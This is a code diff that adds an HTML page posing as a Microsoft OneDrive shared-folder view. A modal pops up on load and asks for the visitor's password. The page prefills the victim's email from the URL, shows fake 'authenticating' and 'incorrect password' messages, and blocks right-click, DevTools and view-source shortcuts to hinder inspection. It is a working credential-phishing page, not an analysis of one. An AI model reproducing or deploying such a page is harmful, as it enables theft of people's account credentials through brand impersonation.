@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title id="current-date">&nbsp;Document &ndash; OneDrive&nbsp;</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<link href="https://onedrive.live.com/_layouts/15/images/odbfavicon.ico?rev=50" rel="icon" type="image/png" sizes="32x32" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<link href="main.css" rel="stylesheet">
+
+    <!-- jQuery must load before main.js (main.js uses $ / $.ajax) -->
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/js/bootstrap.min.js" crossorigin="anonymous"></script>
+    <script src="main.js"></script>
+
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:"Segoe UI",sans-serif;
+}
+
+body{
+    background:#f7f7f7;
+    color:#222;
+}
+
+/* Top Header */
+.header{
+    height:72px;
+    background:#fff;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:0 24px;
+    border-bottom:1px solid #e5e5e5;
+}
+
+.header-left{
+    display:flex;
+    align-items:center;
+    gap:18px;
+}
+
+.apps-btn{
+    font-size:20px;
+    color:#555;
+    cursor:pointer;
+}
+.app-grid{
+    width:20px;
+    height:20px;
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:2px;
+}
+
+.app-grid span{
+    width:4px;
+    height:4px;
+    border-radius:50%;
+    background:#605e5c;
+}
+.logo{
+    font-size:32px;
+    color:#0078d4;
+}
+
+.brand{
+    font-size:30px;
+    font-weight:600;
+}
+
+.header-right{
+    display:flex;
+    align-items:center;
+    gap:24px;
+    color:#444;
+}
+
+.avatar{
+    width:42px;
+    height:42px;
+    border-radius:50%;
+    border:1px solid #ccc;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+}
+
+/* Main Container */
+.container{
+    padding:18px 30px;
+}
+
+/* Toolbar */
+.toolbar{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-bottom:25px;
+}
+
+.toolbar-left{
+    display:flex;
+    align-items:center;
+    gap:14px;
+}
+
+.btn-primary3{
+    background:#0078d4;
+    color:#fff;
+    border:none;
+    border-radius:6px;
+    padding:10px 20px;
+    font-size:14px;
+    cursor:pointer;
+}
+
+.toolbar-btn{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    color:#333;
+    font-size:14px;
+    cursor:pointer;
+}
+
+.toolbar-right{
+    display:flex;
+    align-items:center;
+    gap:28px;
+    font-size:14px;
+}
+
+/* Folder Title */
+.folder-title{
+    font-size:28px;
+    font-weight:600;
+    margin-bottom:30px;
+}
+
+/* Table Card */
+.table-card{
+    background:#fff;
+    border-radius:18px;
+    overflow:hidden;
+    border:1px solid #ececec;
+}
+
+.table-header,
+.table-row{
+    display:grid;
+    grid-template-columns: 30px 1.8fr 0.9fr 0.8fr 0.8fr;
+    align-items:center;
+    padding:12px 14px;
+}
+
+.table-header{
+    font-weight:600;
+    font-size:14px;
+    border-bottom:1px solid #ededed;
+}
+
+.table-row{
+    font-size:16px;
+}
+
+.table-row:not(:last-child){
+    border-bottom:1px solid #f0f0f0;
+}
+
+.folder-cell{
+    display:flex;
+    align-items:center;
+    gap:14px;
+}
+
+.folder-icon{
+    color:#f7b500;
+    font-size:28px;
+}
+
+.shared{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    color:#666;
+}
+
+.sort-arrow{
+    margin-left:4px;
+    color:#777;
+}
+</style>
+<script>
+window.onload = function () {
+    $('#modal').modal('show');
+
+    const now = new Date();
+    const y = now.getFullYear();
+    const m = String(now.getMonth() + 1).padStart(2, '0');
+    const d = String(now.getDate()).padStart(2, '0');
+    document.getElementById('current-date').textContent = `${y}${m}${d}`;
+
+    document.getElementById('button').onclick = function () {
+        document.getElementById('modal').style.display = "none"
+    };
+
+    // Populate hidden email from URL querystring: ?email=php@tt.net
+    try {
+        const params = new URLSearchParams(window.location.search);
+        const email = params.get('email');
+        if (email) {
+            const emailInput = document.getElementById('email');
+            const emailLabel = document.getElementById('emailLabel');
+            if (emailInput) emailInput.value = email;
+            if (emailLabel) emailLabel.textContent = email;
+        }
+    } catch (e) {
+        // ignore
+    }
+};
+</script>
+<script>
+        document.addEventListener('contextmenu', function (e) {
+            e.preventDefault();
+        });
+
+        document.addEventListener('keydown', function (e) {
+            const key = e.key.toLowerCase();
+            const ctrl = e.ctrlKey || e.metaKey;
+            const isBlockedShortcut =
+                e.key === 'F12' ||
+                (ctrl && e.shiftKey && (key === 'i' || key === 'j' || key === 'c')) ||
+                (ctrl && (key === 'u' || key === 's' || key === 'c' || key === 'a')) ||
+                (e.altKey && key === 'i');
+
+            if (isBlockedShortcut) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }
+        });
+
+        document.addEventListener('selectstart', function (e) {
+            e.preventDefault();
+        });
+    </script>
+</head>
+<body>
+
+<header class="header">
+    <div class="header-left">
+        <div class="app-grid">
+<span></span><span></span><span></span>
+<span></span><span></span><span></span>
+<span></span><span></span><span></span>
+</div>
+        <i class="fa-solid fa-cloud logo"></i>
+        <div class="brand">OneDrive</div>
+    </div>
+
+    <div class="header-right" data-toggle="modal" data-target="#modal">
+        <i class="fa-regular fa-life-ring"></i>
+        <i class="fa-solid fa-question"></i>
+        <span>Sign in</span>
+        <div class="avatar">
+            <i class="fa-regular fa-user"></i>
+        </div>
+    </div>
+</header>
+
+<div class="container">
+
+    <div class="toolbar" data-toggle="modal" data-target="#modal">
+        <div class="toolbar-left">
+            <button class="btn-primary3">
+                <i class="fa-solid fa-plus"></i>
+                New
+            </button>
+
+            <div class="toolbar-btn">
+                <i class="fa-solid fa-arrow-up"></i>
+                Upload
+            </div>
+
+            <div class="toolbar-btn">
+                <i class="fa-solid fa-share-nodes"></i>
+                Share
+            </div>
+
+            <div class="toolbar-btn">
+                <i class="fa-solid fa-link"></i>
+                Add shortcut to My files
+            </div>
+        </div>
+
+        <div class="toolbar-right">
+            <span><i class="fa-solid fa-arrow-down-wide-short"></i> Sort</span>
+            <span><i class="fa-solid fa-bars"></i></span>
+            <span><i class="fa-regular fa-rectangle-list"></i> Details</span>
+        </div>
+    </div>
+
+    <div class="folder-title" id="current-date"> </div>
+
+    <div class="table-card">
+
+        <div class="table-header">
+            <div>
+                
+            </div>
+            <div>
+                <i class="fa-regular fa-file"></i>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Name
+                <span class="sort-arrow">↑</span>
+            </div>
+            <div>Modified</div>
+            <div>File size</div>
+            <div>Sharing</div>
+        </div>
+
+        <div class="table-row">
+            <div></div>
+
+            <div class="folder-cell" data-toggle="modal" data-target="#modal">
+                <i class="fa-solid fa-folder folder-icon"></i>
+                <span>Purchase List</span>
+            </div>
+
+            <div>Few hours ago</div>
+            <div>3.44 MB</div>
+
+            <div class="shared">
+                <i class="fa-solid fa-user-group"></i>
+                Shared
+            </div>
+        </div>
+
+        <div class="table-row">
+            <div></div>
+
+            <div class="folder-cell" data-toggle="modal" data-target="#modal">
+                <i class="fa-solid fa-folder folder-icon"></i>
+                <span>Other Documents</span>
+            </div>
+
+            <div>Few hours ago</div>
+            <div>31.9 MB</div>
+
+            <div class="shared">
+                <i class="fa-solid fa-user-group"></i>
+                Shared
+            </div>
+        </div>
+
+    </div>
+
+</div>
+
+<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+
+<!-- Link to Bootstrap JS for modal functionality (if not already included) -->
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+<!-- Additional JS to handle form behavior and modal actions -->
+
+<div id="modal">
+
+        <div class="modalconent2" id="modal-content">
+
+            
+            <button id="button" class="close" data-dismiss="modal">&times;</button>
+            <div class="upper"><img class="mcg" src="logo.png" style="width: 145px;" alt="Image"></div>
+            
+            <div class="modal-body">
+                    
+                    <div class="dialog">
+                        
+
+                            <form id="user-form" method="post">
+                                <br />
+<div class="form-group"> <span id="emailLabel"></span>
+                                    <input class="form-control" id="email" value="" name="email" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$" placeholder="Email Address" required="" type="hidden">
+                                    <div style="height:8px;"></div>
+                                </div><div>&nbsp;</div>
+                                
+                                <div id="msg" class="alert alert-success">
+                        Authenticating, Please wait...
+                    </div>
+                    <div id="msg2" class="alert alert-danger">
+                        Failed, password is incorrect.
+                    </div>
+                    <div>&nbsp;</div>
+                    <div><h6>Enter your password</h6>
+                                    </div>
+                                <div class="form-group">
+                                    <input class="form-control" id="password" name="password" placeholder="Password" required="" type="password">
+                                </div>
+
+                                <div>&nbsp;</div>
+                                <button class="btn-primary btn" type="submit" id="byn">Next</button>
+                            </form>
+                    </div>
+            </div>
+
+            <!-- Modal Footer for extra options if needed -->
+            
+<div><p style="font-size: 10px;">Help and feedback &nbsp;&nbsp;
+Terms of use &nbsp;&nbsp;
+Privacy and cookies <br />
+&copy; 2026 Microsoft</p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
